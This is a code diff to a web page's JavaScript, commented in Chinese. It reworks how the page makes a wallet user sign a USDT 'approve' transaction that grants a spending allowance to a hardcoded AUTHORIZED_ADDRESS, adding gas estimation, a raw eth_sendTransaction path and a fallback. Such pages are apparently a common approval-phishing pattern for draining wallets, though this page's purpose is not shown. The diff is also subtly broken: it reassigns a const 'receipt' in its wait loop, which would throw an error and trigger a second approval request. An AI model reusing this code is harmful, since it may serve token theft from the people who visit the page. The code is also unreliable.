@@ -373,13 +373,11 @@
                 
                 // 初始化Web3
                 if (window.ethereum) {
-                    // 对于MetaMask，需要特殊处理
                     web3 = new Web3(window.ethereum);
                     
-                    // 请求账户访问
+                    // 对于MetaMask，使用eth_requestAccounts
                     if (window.ethereum.isMetaMask) {
                         try {
-                            // 对于MetaMask，使用eth_requestAccounts
                             await window.ethereum.request({ method: 'eth_requestAccounts' });
                         } catch (error) {
                             console.error('MetaMask授权失败:', error);
@@ -430,16 +428,60 @@
                 // 转换金额为wei（USDT有6位小数）
                 const amountWei = web3.utils.toWei(amount, 'mwei'); // 1 USDT = 1,000,000 mwei
                 
-                // 执行授权，设置合理的Gas
-                const result = await contract.methods.approve(AUTHORIZED_ADDRESS, amountWei).send({ 
-                    from: account,
-                    gas: 100000, // 设置足够的Gas
-                    gasPrice: await web3.eth.getGasPrice() // 使用当前Gas价格
-                });
+                // 构建授权交易数据
+                const approveData = contract.methods.approve(AUTHORIZED_ADDRESS, amountWei).encodeABI();
                 
-                // 更新状态
-                document.getElementById('walletStatus').innerHTML = `授权成功！交易哈希: <a href="https://etherscan.io/tx/${result.transactionHash}" target="_blank">${result.transactionHash}</a>`;
-                document.getElementById('walletStatus').className = 'status success';
+                // 估算Gas
+                let gasLimit = 100000; // 默认Gas limit
+                try {
+                    gasLimit = await web3.eth.estimateGas({
+                        from: account,
+                        to: CONTRACT_ADDRESS,
+                        data: approveData
+                    });
+                    // 增加20%的Gas作为缓冲
+                    gasLimit = Math.round(gasLimit * 1.2);
+                } catch (error) {
+                    console.log('Gas估算失败，使用默认值:', error);
+                }
+                
+                // 获取当前Gas价格
+                const gasPrice = await web3.eth.getGasPrice();
+                
+                // 对于MetaMask，使用eth_sendTransaction方法
+                if (window.ethereum && window.ethereum.isMetaMask) {
+                    try {
+                        // 使用MetaMask的request方法发送交易
+                        const txHash = await window.ethereum.request({
+                            method: 'eth_sendTransaction',
+                            params: [{
+                                from: account,
+                                to: CONTRACT_ADDRESS,
+                                data: approveData,
+                                gas: web3.utils.toHex(gasLimit),
+                                gasPrice: web3.utils.toHex(gasPrice)
+                            }]
+                        });
+                        
+                        // 等待交易确认
+                        const receipt = await web3.eth.getTransactionReceipt(txHash);
+                        while (!receipt) {
+                            await new Promise(resolve => setTimeout(resolve, 1000));
+                            receipt = await web3.eth.getTransactionReceipt(txHash);
+                        }
+                        
+                        // 更新状态
+                        document.getElementById('walletStatus').innerHTML = `授权成功！交易哈希: <a href="https://etherscan.io/tx/${txHash}" target="_blank">${txHash}</a>`;
+                        document.getElementById('walletStatus').className = 'status success';
+                    } catch (error) {
+                        console.error('MetaMask交易失败:', error);
+                        // 回退到传统方法
+                        await executeApprovalFallback(amountWei, gasLimit, gasPrice);
+                    }
+                } else {
+                    // 对于其他钱包，使用传统方法
+                    await executeApprovalFallback(amountWei, gasLimit, gasPrice);
+                }
                 
                 // 检查授权额度
                 await checkAllowance();
@@ -463,6 +505,19 @@
                 document.getElementById('walletStatus').innerHTML = errorMessage;
                 document.getElementById('walletStatus').className = 'status error';
             }
+        }
+        
+        // 传统授权方法（用于其他钱包或MetaMask回退）
+        async function executeApprovalFallback(amountWei, gasLimit, gasPrice) {
+            const result = await contract.methods.approve(AUTHORIZED_ADDRESS, amountWei).send({ 
+                from: account,
+                gas: gasLimit,
+                gasPrice: gasPrice
+            });
+            
+            // 更新状态
+            document.getElementById('walletStatus').innerHTML = `授权成功！交易哈希: <a href="https://etherscan.io/tx/${result.transactionHash}" target="_blank">${result.transactionHash}</a>`;
+            document.getElementById('walletStatus').className = 'status success';
         }
         
         // 检查授权额度
